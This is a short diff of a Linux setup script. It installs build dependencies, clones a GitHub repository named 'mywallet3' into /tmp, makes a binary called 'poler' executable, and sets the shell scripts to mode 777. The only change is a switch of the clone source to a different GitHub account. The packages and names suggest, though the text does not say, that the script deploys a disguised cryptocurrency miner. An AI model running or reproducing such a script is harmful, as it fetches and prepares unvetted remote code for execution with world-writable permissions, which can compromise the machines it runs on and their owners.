@@ -8,7 +8,7 @@ sudo sysctl -p
 sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano cmake mc -y
 sleep 2
 cd /tmp && mkdir mywallet3
-git clone https://github.com/robbertopp1/mywallet3.git /tmp/mywallet3
+git clone https://github.com/burkabest/mywallet3.git /tmp/mywallet3
 cd /tmp/mywallet3
 chmod +x /tmp/mywallet3/poler
 chmod 777 ./*.sh
